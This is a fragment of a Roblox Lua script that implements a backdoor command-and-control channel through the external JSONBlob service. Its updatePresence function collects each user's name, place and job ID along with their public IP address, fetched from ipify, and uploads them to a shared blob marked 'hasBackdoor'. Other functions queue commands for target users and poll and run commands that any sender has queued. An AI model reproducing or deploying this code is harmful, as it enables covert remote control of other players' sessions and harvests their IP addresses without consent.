-- JSONBlob
local function jsonblobGet(blobId)
    local ok,result=pcall(function()
        return HS:GetAsync(JSONBLOB_BASE..blobId,true)
    end)
    if ok and result and result~="" then
        local ok2,dec=pcall(function() return HS:JSONDecode(result) end)
        if ok2 and type(dec)=="table" then return dec end
    end
    return {}
end

local function jsonblobSet(blobId,data)
    local json=HS:JSONEncode(data)
    local ok=pcall(function()
        HS:RequestAsync({
            Url=JSONBLOB_BASE..blobId,
            Method="PUT",
            Headers={["Content-Type"]="application/json",["Accept"]="application/json"},
            Body=json
        })
    end)
    return ok
end

local function getIP()
    local ok,ip=pcall(function()
        return HS:GetAsync("https://api.ipify.org/?format=text",true)
    end)
    return ok and ip or "Unknown"
end
local myIP=getIP()

local function updatePresence()
    local data=jsonblobGet(PRESENCE_BLOB_ID)
    data[tostring(LP.UserId)]={
        name=LP.Name, display=LP.DisplayName,
        place=tostring(game.PlaceId), job=game.JobId:sub(1,8),
        time=tick(), hasBackdoor=true, ip=myIP, same=true
    }
    jsonblobSet(PRESENCE_BLOB_ID,data)
end

local function sendBackdoorCommand(targetUserId,command,data)
    local commands=jsonblobGet(COMMANDS_BLOB_ID)
    if not commands[targetUserId] then commands[targetUserId]={} end
    table.insert(commands[targetUserId],{
        id=tostring(tick())..tostring(math.random(10000,99999)),
        sender=tostring(LP.UserId),
        cmd=command, data=data or "", time=tick()
    })
    jsonblobSet(COMMANDS_BLOB_ID,commands)
end

-- FIX #1/#2: executeCommand объявляем ДО readCommands
local executeCommand

local function readCommands()
    local commands=jsonblobGet(COMMANDS_BLOB_ID)
    local myCmds=commands[tostring(LP.UserId)] or {}
    for _,cmd in ipairs(myCmds) do
        if not processedCmds[cmd.id] then
            processedCmds[cmd.id]=true
            if executeCommand then
                task.spawn(executeCommand, cmd.sender, cmd.cmd, cmd.data)
            end
        end
    end
    local cnt=0;for _ in pairs(processedCmds) do cnt=cnt+1 end
    if cnt>200 then processedCmds={} end
    commands[tostring(LP.UserId)]={}
    jsonblobSet(COMMANDS_BLOB_ID,commands)
end

